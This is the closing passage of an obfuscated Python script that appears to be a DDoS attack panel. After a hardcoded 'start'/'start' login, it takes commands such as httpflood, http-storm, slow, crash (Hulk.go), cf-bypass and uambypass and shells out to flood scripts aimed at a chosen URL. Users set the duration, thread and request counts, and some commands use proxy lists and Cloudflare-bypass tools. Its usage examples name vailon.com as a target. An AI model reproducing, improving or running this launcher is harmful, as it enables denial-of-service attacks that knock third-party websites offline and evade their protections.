                llllllllllllllI('Usage: https-spoof <url> <time> <threads>')
                llllllllllllllI('Example: https-spoof http://vailon.com 60 500')
        elif 'slow' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'node slow.js {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: slow <url> <time>')
                llllllllllllllI('Example: slow http://vailon.com 60')
        elif 'hyper' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'node hyper.js {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: hyper <url> <time>')
                llllllllllllllI('Example: hyper http://vailon.com 60')
        elif 'cf-socket' in IllIlIIlIlIlIlIlIl:
            try:
                IllIIIIlIlllII.system(f'python3 bypass.py')
            except llllllllllllIll:
                llllllllllllllI('cf-socket')
        elif 'cf-pro' in IllIlIIlIlIlIlIlIl:
            try:
                IllIIIIlIlllII.system(f'python3 cf-pro.py')
            except llllllllllllIll:
                llllllllllllllI('cf-pro')
        elif 'cf-socket' in IllIlIIlIlIlIlIlIl:
            try:
                IllIIIIlIlllII.system(f'python3 bypass.py')
            except llllllllllllIll:
                llllllllllllllI('cf-socket')
        elif 'http-socket' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                lIllIIlllIlIllIlIl = IllIlIIlIlIlIlIlIl.split()[2]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'node HTTP-SOCKET {IlllIlIllIllIIlIIl} {lIllIIlllIlIllIlIl} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: http-socket <url> <per> <time>')
                llllllllllllllI('Example: http-socket http://example.com 5000 60')
        elif 'http-raw' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'node HTTP-RAW {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: http-raw <url> <time>')
                llllllllllllllI('Example: http-raw http://example.com 60')
        elif 'http-requests' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'node HTTP-REQUESTS {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: http-requests <url> <time>')
                llllllllllllllI('Example: http-requests http://example.org 60')
        elif 'http-rand' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'node HTTP-RAND.js {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: http-rand <url> <time>')
                llllllllllllllI('Example: http-rand http://vailon.com/ 60')
        elif 'cf-bypass' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                IllllIlIIIlIIIIlll = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'node cf.js {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII} {IllllIlIIIlIIIIlll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: cf-bypass <url> <time> <threads>')
                llllllllllllllI('Example: cf-bypass http://example.com 60 1250')
        elif 'uambypass' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                lIllIIlllIlIllIlIl = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'node uambypass.js {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII} {lIllIIlllIlIllIlIl} http.txt')
            except llllllllllllIll:
                llllllllllllllI('Usage: uambypass <url> <time> <req_per_ip>')
                llllllllllllllI('Example: uambypass http://example.com 60 1250')
        elif 'crash' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                lllIIlIIllIllIIIIl = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'go run Hulk.go -site {IlllIlIllIllIIlIIl} -data {lllIIlIIllIllIIIIl}')
            except llllllllllllIll:
                llllllllllllllI('Usage: crash <url> METHODS<GET/POST>')
                llllllllllllllI('Example: crash http://example.com GET')
        elif 'httpflood' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IllllIlIIIlIIIIlll = IllIlIIlIlIlIlIlIl.split()[2]
                lllIIlIIllIllIIIIl = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'go run httpflood.go {IlllIlIllIllIIlIIl} {IllllIlIIIlIIIIlll} {lllIIlIIllIllIIIIl} {IIIlIlllIllllllIII} nil')
            except llllllllllllIll:
                llllllllllllllI('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                llllllllllllllI('Example: httpflood http://example.com 15000 get 60')
        elif 'httpget' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IllIIIIlIlllII.system(f'./httpget {IlllIlIllIllIIlIIl} 10000 50 100')
            except llllllllllllIll:
                llllllllllllllI('Usage: httpget <url>')
                llllllllllllllI('Example: httpget http://example.com')
        elif 'http-storm' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                lIllIIlllIlIllIlIl = IllIlIIlIlIlIlIlIl.split()[3]
                IllllIlIIIlIIIIlll = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'node storm.js {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII} {lIllIIlllIlIllIlIl} {IllllIlIIIlIIIIlll} proxies.txt')
            except llllllllllllIll:
                llllllllllllllI('Usage: http-storm <host> <time> <req> <thread> <proxies.txt>')
                llllllllllllllI('Example: http-storm http://example.org 300 15000 1250 proxies.txt ')
        else:
            try:
                IlIIIllIIIIlIIlIIl = IllIlIIlIlIlIlIlIl.split()[0]
                llllllllllllllI('Command: [ ' + IlIIIllIIIIlIIlIIl + ' ] Not Found!')
            except llllllllllllIll:
                pass

def IIIIllIIlIlllIIIlI():
    lIlllIllIllIIIIlIl()
    IIIlllIlIlIIIIIlII = 'start'
    IIIlIlllIIlIlIIIll = 'start'
    IIIIIllIllllIlIlIl = lllllllllllllII('🔐 Username: ')
    llIlllIIIIIIlIIlll = llIIIIlllIlllI.getpass(prompt='🔑 Password: ')
    if IIIIIllIllllIlIlIl != IIIlllIlIlIIIIIlII or llIlllIIIIIIlIIlll != IIIlIlllIIlIlIIIll:
        llllllllllllllI('')
        llllllllllllllI('❌ AKSES DITOLAK ❌')
        llIIIllIIlIIlI.exit(1)
    elif IIIIIllIllllIlIlIl == IIIlllIlIlIIIIIlII and llIlllIIIIIIlIIlll == IIIlIlllIIlIlIIIll:
        llllllllllllllI('Successful Login')
        IIIlIlllIllllllIII.sleep(0.3)
        IllllIIIIllIllIlIl()
        lllIlIIllIlIlllllI()
IIIIllIIlIlllIIIlI()